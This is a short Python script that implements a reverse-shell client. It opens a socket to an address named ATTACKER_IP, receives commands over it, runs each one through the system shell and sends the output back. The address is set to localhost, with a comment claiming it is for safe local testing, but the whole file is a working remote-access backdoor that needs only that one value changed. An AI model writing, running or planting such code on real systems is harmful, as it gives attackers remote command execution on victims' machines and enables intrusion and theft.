import socket
import subprocess
import sys

# Configuration (Safely targets your own machine for local testing)
ATTACKER_IP = "127.0.0.1"
ATTACKER_PORT = 4444

# Create socket to connect OUT to the attacker
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((ATTACKER_IP, ATTACKER_PORT))
except Exception as e:
    sys.exit("[!] Connection failed. Is the server running?")

while True:
    # Receive command from the attacker server
    command = client.recv(1024).decode()
    
    if command.lower() == "exit" or not command:
        break
        
    try:
        # Execute the command on the system terminal safely
        # shell=True allows executing native commands like 'ls', 'whoami', or 'pwd'
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output  # Return the terminal error message if command fails
    except Exception as e:
        output = f"Execution failed: {str(e)}".encode()
        
    # Send the terminal output back to the attacker
    client.send(output if output else b"Command executed successfully, no output.")

client.close()
